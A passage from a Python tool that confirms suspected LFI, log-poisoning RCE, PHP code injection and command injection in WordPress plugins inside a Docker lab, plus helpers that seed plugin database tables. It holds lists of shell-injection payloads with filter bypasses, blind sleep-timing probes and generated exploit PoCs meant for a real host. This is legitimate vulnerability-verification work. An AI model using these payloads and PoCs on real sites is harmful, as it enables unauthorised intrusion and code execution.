                f"(el marcador aparecio sin etiquetas PHP) -- ejecucion remota de codigo "
                f"a partir de un Local File Inclusion")
            _lfi_poc_params = dict(_lfi_base_params); _lfi_poc_params[path_param] = res.evidence["lfi_rce_payload"]
            res.exploit_poc = _build_exploit_poc(
                base_url=boot.base_url, endpoint=endpoint, method=m,
                params=_lfi_poc_params, technique="LFI-to-RCE (log poisoning)",
                description=f"LFI-to-RCE on '{path_param}': Apache log poisoned with PHP, then included via LFI to execute code. Replace TARGET with the real host.")
            _capture_exploit_shot(
                boot, m, endpoint, res.evidence.get("lfi_rce_fragmento", ""), highlight="",
                caption_es=(f"Paso 5 (CLAVE): LFI-A-RCE CONFIRMADO — fragmento del log de Apache "
                            f"incluido y ejecutado como PHP. Payload: {path_param}={res.evidence['lfi_rce_payload']!r}"),
                caption_en=(f"Step 5 (KEY): LFI-TO-RCE CONFIRMED — Apache log poisoned and included as PHP. "
                            f"Payload: {path_param}={res.evidence['lfi_rce_payload']!r}"))
        elif php_canary_found:
            res.verified = True
            res.ok = True
            res.detail = (
                f"PHP-INCLUDE LFI confirmado (canario PHP): "
                f"{path_param}={res.evidence['lfi_php_canary_payload']!r} ejecuto el "
                f"canario PHP plantado en /tmp/ (secreto encontrado en la respuesta) -- "
                f"el plugin hace require_once/include con sufijo .php hardcoded, "
                f"permitiendo traversal de directorios")
            _lfi_poc_params = dict(_lfi_base_params); _lfi_poc_params[path_param] = res.evidence["lfi_php_canary_payload"]
            res.exploit_poc = _build_exploit_poc(
                base_url=boot.base_url, endpoint=endpoint, method=m,
                params=_lfi_poc_params, technique="PHP-include LFI",
                description=f"PHP-include LFI on '{path_param}': path traversal reaches /tmp/ — plugin appends .php suffix. Replace TARGET with the real host.")
            _capture_exploit_shot(
                boot, m, endpoint, res.evidence.get("lfi_php_canary_resp_recorte", ""), highlight=_php_lfi_secret,
                caption_es=(f"Paso 5 (CLAVE): LFI PHP-INCLUDE CONFIRMADO — respuesta con secreto "
                            f"del canario PHP ejecutado. Payload: {path_param}={res.evidence['lfi_php_canary_payload']!r}"),
                caption_en=(f"Step 5 (KEY): LFI PHP-INCLUDE CONFIRMED — response with PHP canary secret. "
                            f"Payload: {path_param}={res.evidence['lfi_php_canary_payload']!r}"))
        elif read_found:
            res.verified = True
            res.ok = True
            res.detail = (
                f"LFI DE LECTURA confirmado: "
                f"{path_param}={res.evidence['lfi_lectura_payload']!r} incluyo el "
                f"contenido de '{res.evidence['lfi_lectura_fichero']}' en la respuesta "
                f"(patron encontrado) -- lectura de ficheros del servidor; "
                f"RCE via log poisoning no se confirmo en este entorno")
            _lfi_poc_params = dict(_lfi_base_params); _lfi_poc_params[path_param] = res.evidence["lfi_lectura_payload"]
            res.exploit_poc = _build_exploit_poc(
                base_url=boot.base_url, endpoint=endpoint, method=m,
                params=_lfi_poc_params, technique="LFI read",
                description=f"LFI read on '{path_param}': {res.evidence.get('lfi_lectura_fichero','file')} contents leaked. Replace TARGET with the real host.")
            _capture_exploit_shot(
                boot, m, endpoint, res.evidence.get("lfi_lectura_resp_recorte", ""),
                highlight=res.evidence.get("lfi_lectura_fichero", ""),
                caption_es=(f"Paso 5 (CLAVE): LFI LECTURA CONFIRMADO — contenido de "
                            f"'{res.evidence.get('lfi_lectura_fichero','')}' en la respuesta. "
                            f"Payload: {path_param}={res.evidence['lfi_lectura_payload']!r}"),
                caption_en=(f"Step 5 (KEY): LFI READ CONFIRMED — '{res.evidence.get('lfi_lectura_fichero','')}' "
                            f"content in response. Payload: {path_param}={res.evidence['lfi_lectura_payload']!r}"))
        else:
            res.ok = True
            res.detail = (
                f"se probaron {len(read_tried)} payloads de lectura y {len(rce_tried)} "
                f"rutas de log para LFI-a-RCE -- ninguno confirmo inclusion de fichero "
                f"como codigo ni lectura de /etc/passwd o wp-config.php")
            # LFI param fuzzing — reuse running lab (no extra Docker cost)
            if (not res.verified and parameters
                    and (_tried_params_set is None or len(_tried_params_set) < 4)):
                _lfi2_already = (_tried_params_set or frozenset()) | {path_param}
                _lfi2_names = (list(parameters.keys()) if isinstance(parameters, dict)
                               else list(parameters))
                _lfi2_cands = []
                for _h in _PATH_HINTS:
                    for _pn in _lfi2_names:
                        if _h in _pn.lower() and _pn not in _lfi2_already and _pn not in _lfi2_cands:
                            _lfi2_cands.append(_pn)
                if _lfi2_cands:
                    _lfi2_next = _lfi2_cands[0]
                    _lfi2_budget = max(60.0, budget_s - (time.time() - t0))
                    step(f"LFI-RCE param fuzzing: '{path_param}' sin inclusion; "
                         f"probando siguiente candidato '{_lfi2_next}'...")
                    _lfi2_rot = verify_wordpress_lfi(
                        plugin_source_dir, slug, endpoint, http_method,
                        parameters, path_param_hint=_lfi2_next,
                        on_step=on_step, budget_s=_lfi2_budget,
                        companion_plugins=companion_plugins,
                        shortcode_name=shortcode_name,
                        keep_lab_on_failure=False,
                        _tried_params_set=_lfi2_already,
                        _live_boot=boot,  # reuse running lab
                    )
                    if _lfi2_rot.verified:
                        res.evidence["screenshots"] = boot.shots
                        res.evidence["http_captures"] = boot.http_captures
                        return _lfi2_rot
        res.evidence["screenshots"] = boot.shots
        res.evidence["http_captures"] = boot.http_captures
        # Post-LFI escalation: when file read confirmed, try wp-config and log poisoning
        if res.verified and boot is not None:
            _lfi_payload_used = (res.evidence.get("lfi_lectura_payload")
                                 or res.evidence.get("lfi_rce_payload")
                                 or res.evidence.get("lfi_php_canary_payload") or "")

            def _lfi_read_fn(file_path: str) -> str:
                _ep_lfi = endpoint
                _params_lfi = (parameters if isinstance(parameters, dict)
                               else dict.fromkeys(parameters or [], ""))
                _p_lfi = dict(_params_lfi)
                _p_lfi[path_param] = file_path
                try:
                    _lfi_sess = _make_session()
                    _lfi_url = boot.base_url.rstrip("/") + _ep_lfi
                    if m.upper() == "GET":
                        _lr = _lfi_sess.get(_lfi_url, params=_p_lfi, timeout=10, verify=False)
                    else:
                        _lr = _lfi_sess.post(_lfi_url, json=_p_lfi, timeout=10, verify=False)
                    return _lr.text if _lr else ""
                except Exception:
                    return ""

            _lfi_esc = escalate_post_lfi(
                lab, boot.base_url, _lfi_read_fn, path_param, step=step)
            if _lfi_esc:
                res.evidence["post_exploit_lfi"] = _lfi_esc
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        res.confidence = "not_reproducible"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        res.confidence = "not_reproducible"
        return res
    finally:
        if _owns_boot:
            _finalize_lab(lab, boot, res, step, keep_lab_on_failure)


def verify_wordpress_php_code_injection(
    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
    parameters, code_param_hint: str = "",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
    companion_plugins: Optional[list] = None,
    json_body: bool = False,
    extra_body_params: Optional[dict] = None,
    keep_lab_on_failure: bool = False,
) -> WpVerifyResult:
    """Verifica PHP code injection (eval/exec de codigo PHP arbitrario) enviando un marcador
    calculable: el payload pide `echo 'BIN_'.md5('secret');` y, si la respuesta contiene el hash
    conocido, es prueba inequivoca de que el servidor evaluo el codigo PHP -- no una deduccion
    por status code ni reflejo literal. Cubre plugins que exponen un endpoint REST/AJAX que
    acepta codigo PHP directamente (p.ej. WP Query Console /wp-json/wqc/v1/query)."""
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(plugin_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()

    params_list = list(parameters.keys() if isinstance(parameters, dict) else (parameters or []))
    # Identify the code execution parameter
    code_param = code_param_hint
    if not code_param:
        for hint in _PHP_CODE_HINTS:
            for p in params_list:
                if hint in p.lower():
                    code_param = p
                    break
            if code_param:
                break
    if not code_param and params_list:
        code_param = params_list[0]  # fallback: first param
    if not code_param:
        res.detail = "no se identifico el parametro que lleva codigo PHP al servidor"
        res.limitations.append("verificacion de PHP code injection necesita saber qué "
                               "parametro lleva el codigo PHP; afina code_param_hint")
        return res

    lab = _Lab(_token())
    boot = None
    try:
        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s,
                              companion_plugins=companion_plugins)
        if boot is None:
            return res

        import hashlib
        secret = secrets.token_hex(8)
        marker = "BIN_" + hashlib.md5(secret.encode()).hexdigest()[:12]
        # PHP payloads: cada uno debe producir el marcador en la respuesta si PHP lo evalua
        payloads = [
            f"echo '{marker}';",
            f"print('{marker}');",
            f"echo md5('{secret}');",   # alternative: check partial hash
            f"var_dump('{marker}');",
            f"die('{marker}');",
            f"exit('{marker}');",
        ]

        m = (http_method or "POST").upper()
        base_params = dict(parameters) if isinstance(parameters, dict) else {}
        endpoint, base_params = _auto_resolve_wp_blockers(
            boot, lab, slug, m, endpoint, base_params, code_param, res, step)

        res.evidence.update({
            "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
            "code_param": code_param, "marker": marker, "metodo": m, "endpoint": endpoint,
        })

        found = False
        tried = []
        for php_payload in payloads:
            payload = dict(base_params)
            payload[code_param] = php_payload
            step(f"probando {m} {endpoint} con {code_param}={php_payload!r}...")
            try:
                if json_body or m == "POST":
                    body = dict(extra_body_params or {})
                    body[code_param] = php_payload
                    if json_body:
                        resp = boot.sub_sess.request(m, boot.base_url + endpoint,
                                                     json=body, timeout=20)
                    else:
                        resp = boot.sub_sess.request(m, boot.base_url + endpoint,
                                                     data=body, timeout=20)
                else:
                    resp = boot.sub_sess.request(m, boot.base_url + endpoint,
                                                 params=payload, timeout=20)
            except Exception as e:
                tried.append({"payload": php_payload, "error": str(e)})
                continue
            body_text = resp.text or ""
            found_marker = marker in body_text
            # Also check if partial MD5 is present (for the md5() payload)
            if not found_marker and secret in php_payload:
                partial = hashlib.md5(secret.encode()).hexdigest()[:12]
                found_marker = partial in body_text
            tried.append({"payload": php_payload, "status": resp.status_code,
                          "marker_presente": found_marker,
                          "respuesta_recorte": body_text[:300]})
            if found_marker:
                found = True
                res.evidence["payload_ganador"] = php_payload
                res.evidence["status_code_respuesta"] = resp.status_code
                res.evidence["respuesta_cuerpo_recorte"] = body_text[:500]
                res.evidence["tecnica"] = "php-code-injection-echo"
                step(f"VERIFICADO: la respuesta contiene el marcador '{marker}', prueba de que "
                     f"el servidor evaluo el codigo PHP.")
                _capture_exploit_shot(
                    boot, m, endpoint, resp, highlight=marker,
                    caption_es=(f"PHP CODE INJECTION CONFIRMADA — marcador '{marker}' en respuesta. "
                                f"Payload: {code_param}={php_payload!r}"),
                    caption_en=(f"PHP CODE INJECTION CONFIRMED — marker '{marker}' in response. "
                                f"Payload: {code_param}={php_payload!r}"))
                break
        res.evidence["intentos"] = tried

        if found:
            res.verified = True
            res.ok = True
            res.detail = (f"PHP CODE INJECTION confirmada: el payload {code_param}="
                          f"{res.evidence['payload_ganador']!r} hizo que el servidor evaluara "
                          f"codigo PHP y devolviera el marcador '{marker}' -- prueba inequivoca "
                          f"de ejecucion de codigo PHP en el servidor")
        else:
            res.ok = True
            res.detail = (f"se probaron {len(tried)} payloads PHP en {code_param}, ninguno "
                          f"devolvio el marcador '{marker}' -- PHP code injection no confirmada "
                          f"(puede que el endpoint necesite autenticacion, nonce especifico, o "
                          f"el parametro correcto no sea '{code_param}')")
        res.evidence["screenshots"] = boot.shots
        res.evidence["http_captures"] = boot.http_captures
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        _finalize_lab(lab, boot, res, step, keep_lab_on_failure)


def verify_wordpress_command_injection(
    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
    parameters, cmd_param_hint: str = "",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
    companion_plugins: Optional[list] = None,
    extra_nonce_pages: Optional[list] = None,
    extra_setup_trigger_paths: Optional[list] = None,
    shortcode_name: Optional[str] = None,
    keep_lab_on_failure: bool = False,
) -> WpVerifyResult:
    """Verifica command/OS injection probando que el servidor remoto EVALUA aritmetica que nunca
    se le mando literal: el payload pide `$(( a + b ))` para dos numeros aleatorios y, si la
    respuesta contiene la SUMA (y la suma no aparece en ningun punto del payload enviado, solo
    los dos operandos por separado), es prueba inequivoca de que un shell remoto ejecuto el
    comando -- no una deduccion por status code ni por reflejo literal del input."""
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(plugin_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()

    cmd_param = cmd_param_hint or _pick_param(parameters, _CMD_HINTS)
    if not cmd_param:
        res.detail = "no se identifico el parametro que llega al comando del sistema"
        res.limitations.append("la verificacion de command injection necesita saber que "
                               "parametro llega al comando; afina 'parameters' en la hipotesis "
                               "del LLM o pasalo a mano (cmd_param_hint)")
        return res

    lab = _Lab(_token())
    boot = None
    try:
        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s,
                              companion_plugins=companion_plugins,
                              extra_setup_trigger_paths=extra_setup_trigger_paths,
                              shortcode_name=shortcode_name)
        if boot is None:
            return res

        a, b = secrets.randbelow(8000) + 1000, secrets.randbelow(8000) + 1000
        expected = a + b
        calc = f"$(( {a} + {b} ))"
        attempts = [
            # separadores de comando estandar (sh/bash/dash/ash)
            f"; echo {calc}", f"| echo {calc}", f"&& echo {calc}", f"|| echo {calc}",
            f"& echo {calc}",
            f"\necho {calc}\n", f"\r\necho {calc}\r\n",
            # sustitucion de comandos (funciona aunque el valor ya este entre comillas/concatenado)
            f"`echo {calc}`", f"$(echo {calc})",
            # rotura de contexto de comillas antes del separador (cuando el codigo envuelve el
            # valor en comillas simples/dobles antes de pasarlo al shell)
            f"' ; echo {calc} ; '", f'" ; echo {calc} ; "',
            f"' && echo {calc} && echo '", f'" && echo {calc} && echo "',
            f"' | echo {calc} #", f'" | echo {calc} #',
            # bypass de filtro de espacios (sustituir ' ' por ${IFS} o %09, comun cuando el codigo
            # bloquea el caracter espacio pero no el separador de comando)
            f";echo${{IFS}}{calc}", f";echo%09{calc}",
            # PowerShell (si el plugin invoca un binario via proc_open/shell_exec en Windows)
            f"; powershell -c \"{calc}\"", f"| powershell -c \"{calc}\"",
            # el valor entero como comando (si el parametro ES el comando completo, no un
            # argumento que se concatena a otro)
            f"echo {calc}", calc,
        ]
        m = (http_method or "GET").upper()
        base_params = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
        endpoint, base_params = _auto_resolve_wp_blockers(
            boot, lab, slug, m, endpoint, base_params, cmd_param, res, step,
            extra_nonce_pages=extra_nonce_pages)

        res.evidence.update({
            "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
            "cmd_param": cmd_param, "a": a, "b": b, "suma_esperada": expected,
            "metodo": m, "endpoint": endpoint,
        })

        pattern = re.compile(rf"(?<!\d){expected}(?!\d)")
        found = False
        tried = []
        for payload_value in attempts:
            payload = dict(base_params)
            payload[cmd_param] = payload_value
            step(f"probando {m} {endpoint} con {cmd_param}={payload_value!r}...")
            try:
                resp = boot.sub_sess.request(m, boot.base_url + endpoint,
                                   data=payload if m != "GET" else None,
                                   params=payload if m == "GET" else None, timeout=20)
            except Exception as e:
                tried.append({"payload": payload_value, "error": str(e)})
                continue
            matched = bool(pattern.search(resp.text or ""))
            tried.append({"payload": payload_value, "status": resp.status_code, "suma_presente": matched})
            if matched:
                found = True
                res.evidence["payload_ganador"] = payload_value
                res.evidence["status_code_respuesta"] = resp.status_code
                res.evidence["respuesta_cuerpo_recorte"] = (resp.text or "")[:500]
                step(f"VERIFICADO: la respuesta contiene {expected} (={a}+{b}), calculado por un "
                     f"shell remoto -- ese numero no aparece en el payload enviado.")
                # Captura HTTP (GET y POST)
                _capture_exploit_shot(
                    boot, m, endpoint, resp, highlight=str(expected),
                    caption_es=(f"Paso 5 (CLAVE): COMMAND INJECTION CONFIRMADA — respuesta con "
                                f"{expected} (={a}+{b}) calculado por shell remoto. "
                                f"Payload: {cmd_param}={payload_value!r}"),
                    caption_en=(f"Step 5 (KEY): COMMAND INJECTION CONFIRMED — response with "
                                f"{expected} (={a}+{b}) from remote shell. "
                                f"Payload: {cmd_param}={payload_value!r}"))
                if m == "GET":
                    shot_url = (boot.base_url + endpoint
                               + ("&" if "?" in endpoint else "?")
                               + f"{cmd_param}={payload_value}")
                    boot.capture(boot.sub_sess, shot_url[len(boot.base_url):],
                           f"Paso 5b: EJECUCION (navegador) — suma {expected} visible.",
                           f"Step 5b: COMMAND EXECUTION (browser) — sum {expected} visible.")
                break
        res.evidence["intentos"] = tried

        # fallback blind/time-based: si ninguna variante devolvio la suma en la respuesta (p.ej.
        # porque el comando se ejecuta pero su salida nunca se refleja -- "blind" command
        # injection), se mide el RETRASO real que un `sleep` inyectado provoca, comparado contra
        # una peticion de control -- si el servidor tarda sistematicamente ~N segundos mas con el
        # sleep que sin el, es prueba de ejecucion aunque no haya salida visible.
        sleep_evidence = None
        if not found:
            step("ninguna variante reflejo la suma; probando blind command injection por "
                 "temporizacion (sleep)...")
            base_payload = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
            base_payload[cmd_param] = "1"
            try:
                t_base0 = time.time()
                boot.sub_sess.request(m, boot.base_url + endpoint,
                                      data=base_payload if m != "GET" else None,
                                      params=base_payload if m == "GET" else None, timeout=20)
                baseline_s = time.time() - t_base0
            except Exception:
                baseline_s = None
            sleep_n = 6
            sleep_attempts = [f"; sleep {sleep_n}", f"| sleep {sleep_n}", f"`sleep {sleep_n}`",
                              f"$(sleep {sleep_n})", f"&& sleep {sleep_n}"]
            for sp in sleep_attempts:
                payload = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
                payload[cmd_param] = sp
                step(f"probando {m} {endpoint} con {cmd_param}={sp!r} (temporizacion)...")
                try:
                    t0_s = time.time()
                    boot.sub_sess.request(m, boot.base_url + endpoint,
                                          data=payload if m != "GET" else None,
                                          params=payload if m == "GET" else None,
                                          timeout=sleep_n + 15)
                    elapsed = time.time() - t0_s
                except Exception:
                    continue
                delayed = (baseline_s is not None and elapsed - baseline_s >= sleep_n - 1.5)
                sleep_evidence = {"payload": sp, "baseline_s": round(baseline_s, 2) if baseline_s else None,
                                  "elapsed_s": round(elapsed, 2), "retraso_consistente": delayed}
                if delayed:
                    found = True
                    res.evidence["payload_ganador"] = sp
                    res.evidence["tecnica"] = "blind-timing"
                    step(f"VERIFICADO (blind/timing): la peticion con {sp!r} tardo {elapsed:.1f}s "
                         f"frente a {baseline_s:.1f}s de control -- el shell remoto ejecuto "
                         f"'sleep {sleep_n}', no se ve la salida pero el retraso lo confirma.")
                    break
            res.evidence["blind_timing_intento"] = sleep_evidence

        if found:
            res.verified = True
            res.ok = True
            if res.evidence.get("tecnica") == "blind-timing":
                res.detail = (f"COMMAND INJECTION confirmada (blind/timing): la peticion con "
                              f"{cmd_param}={res.evidence['payload_ganador']!r} retraso la "
                              f"respuesta de forma consistente con 'sleep {sleep_n}' ejecutandose "
                              f"de verdad en un shell remoto -- no hay salida visible, pero el "
                              f"retraso medido es la prueba")
            else:
                res.detail = (f"COMMAND INJECTION confirmada: la peticion con {cmd_param}="
                              f"{res.evidence['payload_ganador']!r} hizo que el servidor "
                              f"EJECUTARA {a}+{b} y devolviera {expected} en la respuesta -- "
                              f"prueba inequivoca de ejecucion remota de comandos (el payload "
                              f"enviado no contiene el numero {expected} en ningun punto)")
        else:
            res.ok = True
            res.detail = (f"se probaron {len(tried)} variantes de inyeccion (arimetica reflejada) "
                          f"y {len(sleep_evidence and [sleep_evidence] or [])} de timing ciega "
                          f"para {cmd_param}, y ninguna confirmo la suma esperada ({a}+{b}="
                          f"{expected}) ni un retraso consistente -- la inyeccion de comandos no "
                          f"se confirmo (puede necesitar otro separador de comandos, otro shell, "
                          f"o el endpoint/parametro no son los reales)")
        res.evidence["screenshots"] = boot.shots
        res.evidence["http_captures"] = boot.http_captures
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        _finalize_lab(lab, boot, res, step, keep_lab_on_failure)


def _detect_plugin_tables(plugin_source_dir: str) -> list:
    """Escanea el codigo PHP del plugin buscando consultas SELECT/INSERT/UPDATE que referencian
    tablas personalizadas (con prefijo $wpdb->prefix, 'wp_' literal, o {$wpdb->prefix}...).
    Devuelve lista de nombres de tabla sin prefijo (p.ej. ['rooms', 'bookings', 'courses']),
    deduplicados y ordenados por frecuencia de aparicion. Util para sembrar seed data antes de
    verificar SQLi booleana en plugins que necesitan filas en esas tablas para producir diferencial."""
    if not plugin_source_dir or not os.path.isdir(plugin_source_dir):
        return []
    table_counts: dict = {}
    # patrones: `{$wpdb->prefix}tablename`, `$wpdb->prefix.'tablename'`, "'wp_tablename'"
    _TABLE_RE = re.compile(
        r'(?:\{\$wpdb->prefix\}|{?\$wpdb->prefix\s*\.\s*[\'"]|[\'"]wp_)([a-zA-Z][a-zA-Z0-9_]{1,40})(?:[\'"])?',
        re.IGNORECASE)
    _SKIP_TABLES = {
        # WordPress core tables
        "posts", "postmeta", "terms", "term_taxonomy", "term_relationships",
        "options", "users", "usermeta", "comments", "commentmeta",
        "links", "user_registrations", "blogs", "signups",
        # WordPress action/filter hooks that contain 'wp_' prefix but are NOT tables:
        # add_action('wp_enqueue_scripts', ...), register_uninstall_hook(), etc.
        "enqueue_scripts", "enqueue_styles", "head", "footer", "loaded",
        "uninstall_plugin", "user_id", "insert_post", "update_post_meta",
        "ajax", "admin_ajax", "login_init", "admin_init", "init",
        "set_current_user", "dashboard_setup", "admin_enqueue_scripts",
        "admin_menu", "admin_notices", "widgets_init", "plugins_loaded",
        "after_setup_theme", "template_redirect", "wp_cron",
    }
    # Only match table names that appear in SQL query context (SELECT/INSERT/UPDATE/DELETE/FROM/JOIN)
    # to avoid false positives from add_action('wp_hookname', ...) patterns.
    _SQL_CONTEXT_RE = re.compile(
        r'(?:SELECT|INSERT|UPDATE|DELETE|FROM|JOIN|INTO)\b[^\n]{0,120}'
        r'(?:\{\$wpdb->prefix\}|{?\$wpdb->prefix\s*\.\s*[\'"]|[\'"]wp_)([a-zA-Z][a-zA-Z0-9_]{1,40})',
        re.IGNORECASE)
    for root, _, files in os.walk(plugin_source_dir):
        for fname in files:
            if not fname.endswith(".php"):
                continue
            fpath = os.path.join(root, fname)
            try:
                with open(fpath, encoding="utf-8", errors="replace") as fh:
                    content = fh.read(400_000)  # max 400KB por fichero (rsvpmaker-email.php es 270KB)
            except Exception:
                continue
            # First pass: SQL context (high confidence)
            for m in _SQL_CONTEXT_RE.finditer(content):
                tbl = m.group(1).lower()
                if tbl not in _SKIP_TABLES and len(tbl) > 2:
                    table_counts[tbl] = table_counts.get(tbl, 0) + 2  # weight 2 for SQL context
            # Second pass: any wp_ prefix match (lower confidence, +1 only if not already found)
            for m in _TABLE_RE.finditer(content):
                tbl = m.group(1).lower()
                if tbl not in _SKIP_TABLES and len(tbl) > 2:
                    table_counts[tbl] = table_counts.get(tbl, 0) + 1
    return sorted(table_counts, key=lambda t: -table_counts[t])


_CT_RE = re.compile(
    r'CREATE\s+TABLE\s+(?:IF\s+NOT\s+EXISTS\s+)?'
    r'[`\'\"]?(?:\{[^}]+\}|\$[a-zA-Z_]+->(?:prefix|base_prefix))?([a-z0-9_]+)[`\'\"]?\s*\(',
    re.IGNORECASE)
_COL_RE = re.compile(
    r'^\s*[`\'\"]?([a-z0-9_]+)[`\'\"]?\s+'
    r'((?:tiny|small|medium|big)?int(?:eger)?(?:\(\d+\))?|bigint(?:\(\d+\))?'
    r'|varchar(?:\(\d+\))?|char(?:\(\d+\))?|text|mediumtext|longtext|tinytext'
    r'|datetime|timestamp|date|float(?:\(\d+,\d+\))?|double(?:\(\d+,\d+\))?'
    r'|decimal(?:\(\d+,\d+\))?|blob|enum\([^)]+\))',
    re.IGNORECASE)
_COL_NOT_NULL_RE = re.compile(r'\bNOT\s+NULL\b', re.IGNORECASE)
_COL_DEFAULT_RE = re.compile(r"\bDEFAULT\s+'?([^',\s)]+)'?", re.IGNORECASE)
_COL_AUTO_RE = re.compile(r'\bAUTO_INCREMENT\b', re.IGNORECASE)
_ENUM_VALS_RE = re.compile(r"enum\(([^)]+)\)", re.IGNORECASE)


def _extract_schema_from_plugin(plugin_source_dir: str) -> dict:
    """Escanea los .php del plugin buscando sentencias CREATE TABLE y extrae el schema
    de columnas. Devuelve {table_name: [{name, type, nullable, default, auto}]}."""
    schema: dict = {}
    if not plugin_source_dir or not os.path.isdir(plugin_source_dir):
        return schema
    for root, _dirs, files in os.walk(plugin_source_dir):
        for fname in files:
            if not fname.endswith(".php"):
                continue
            fpath = os.path.join(root, fname)
            try:
                with open(fpath, encoding="utf-8", errors="ignore") as fh:
                    src = fh.read()
            except Exception:
                continue
            for m in _CT_RE.finditer(src):
                tbl = m.group(1).lower()
                # find the closing paren for this CREATE TABLE
                start = m.end()
                depth = 1
                pos = start
                while pos < len(src) and depth > 0:
                    if src[pos] == '(':
                        depth += 1
                    elif src[pos] == ')':
                        depth -= 1
                    pos += 1
                body = src[start:pos - 1]
                cols = []
                for line in body.split("\n"):
                    cm = _COL_RE.match(line)
                    if not cm:
                        continue
                    col_name = cm.group(1).lower()
                    if col_name in ("primary", "unique", "key", "index", "constraint",
                                    "fulltext", "spatial"):
                        continue
                    col_type = cm.group(2).lower()
                    nullable = not bool(_COL_NOT_NULL_RE.search(line))
                    auto = bool(_COL_AUTO_RE.search(line))
                    dm = _COL_DEFAULT_RE.search(line)
                    default = dm.group(1) if dm else None
                    cols.append({"name": col_name, "type": col_type,
                                 "nullable": nullable, "default": default, "auto": auto})
                if cols and tbl not in schema:
                    schema[tbl] = cols
    return schema


def _schema_insert_values(cols: list, sqli_param: str = "",
                          sqli_param_value: str = "") -> tuple:
    """Construye (col_list, val_list) para INSERT desde schema extraído."""
    _TEXT_COLS = {"uri": "/test-page", "page": "/", "url": "http://example.com",
                  "slug": "test-post", "path": "/test", "query": "test",
                  "email": "seed@example.com", "username": "seeduser", "user": "seeduser",
                  "code": "SEED1", "token": "seedtoken", "key": "seedkey",
                  "hash": "seedhash", "ref": "seedref", "name": "seedname",
                  "title": "Seed Title", "content": "seed content", "status": "active"}
    col_names, col_vals = [], []
    for c in cols:
        if c.get("auto"):
            continue
        if not c.get("nullable") and c.get("default") is None:
            cname = c["name"]
            ctype = c["type"]
            if any(t in ctype for t in ("int", "float", "double", "decimal")):
                val = "1"
            elif "enum" in ctype:
                em = _ENUM_VALS_RE.search(ctype)
                val = em.group(1).split(",")[0].strip("'\" ") if em else "1"
                val = f"'{val}'"
            elif any(t in ctype for t in ("datetime", "timestamp")):
                val = "NOW()"
            elif "date" in ctype:
                val = "'2024-01-01'"
            else:
                # text/varchar: use sqli_param_value if column name matches
                if sqli_param and cname == sqli_param.lower() and sqli_param_value:
                    sv = sqli_param_value.replace("'", "\\'")[:100]
                    val = f"'{sv}'"
                else:
                    hint_val = _TEXT_COLS.get(cname)
                    val = f"'{hint_val}'" if hint_val else "'seed'"
            col_names.append(f"`{cname}`")
            col_vals.append(val)
    return col_names, col_vals


def _seed_plugin_tables(lab: "_Lab", db_pw: str, tables: list, step,
                        sqli_param: str = "", sqli_param_value: str = "",
                        plugin_source_dir: str = "") -> int:
    """Intenta sembrar una fila minima en cada tabla personalizada del plugin (hasta 3 tablas,
    las mas frecuentes segun _detect_plugin_tables). Usa IGNORE para no fallar si la fila ya
    existe o si la tabla no tiene las columnas esperadas. Devuelve el numero de tablas sembradas.
    El objetivo es que el endpoint devuelva al menos una fila para que el diferencial booleano
    sea detectable (TRUE=filas, FALSE=vacio) en plugins que fallan por DB vacia."""
    seeded = 0
    # Priorizar tablas cuyo nombre contiene sqli_param: p.ej. si sqli_param='email',
    # 'rsvpmaker_guest_email' sube al primer puesto aunque el static-analysis la ordene 7+.
    # Esto tambien resuelve tablas creadas lazily (via dbDelta en el primer request de control)
    # que no estaban en MySQL cuando corrio el static-analysis scan inicial.
    if sqli_param:
        tables = sorted(tables, key=lambda t: 0 if sqli_param.lower() in t.lower() else 1)
    # Priorizar tablas email/mail/guest/subscriber cuando sqli_param_value es un email:
    # rsvpmaker_guest_email contiene 'email' y es la tabla correcta, pero sin esta ordenacion
    # cae en posicion 9+ (detras de tablas genericas como enqueue_scripts, unique_post_slug).
    if sqli_param_value and "@" in sqli_param_value:
        _email_tbl_hints = ("email", "mail", "guest", "subscriber", "member")
        tables = sorted(tables, key=lambda t: 0 if any(h in t.lower() for h in _email_tbl_hints) else 1)
    step(f"[seed debug] sqli_param={sqli_param!r} first8={tables[:8]}")
    for tbl in tables[:8]:
        full = f"wp_{tbl}"
        # Intentar varias formas de INSERT, de menos a mas especulativo:
        # 1. Solo id=1 (PK explicita)
        # 2. Sin columnas (funciona con PKs auto-increment)
        # 3. Usando DESCRIBE para construir un INSERT válido con valores por defecto
        inserted = False
        for q in [
            f"INSERT IGNORE INTO {full} (id) VALUES (1);",
            f"INSERT IGNORE INTO {full} () VALUES ();",
        ]:
            r = lab.exec_mysql(q, db_pw)
            # None = SQL error (tabla inexistente, violacion de constraint no ignorable, etc.)
            # "" = INSERT exitoso sin filas de salida (DML normal con INSERT IGNORE)
            if r is not None:
                inserted = True
                break
        # Fallback 3: DESCRIBE para descubrir columnas NOT NULL y construir INSERT válido
        if not inserted:
            desc_r = lab.exec_mysql(f"DESCRIBE {full};", db_pw)
            if desc_r is None:
                # DESCRIBE falló → la tabla no existe (fue detectada por falso positivo del regex)
                step(f"seed data: {full} no existe en DB (falso positivo del grep de tablas) -- omitida")
                continue
            nn_cols = {}
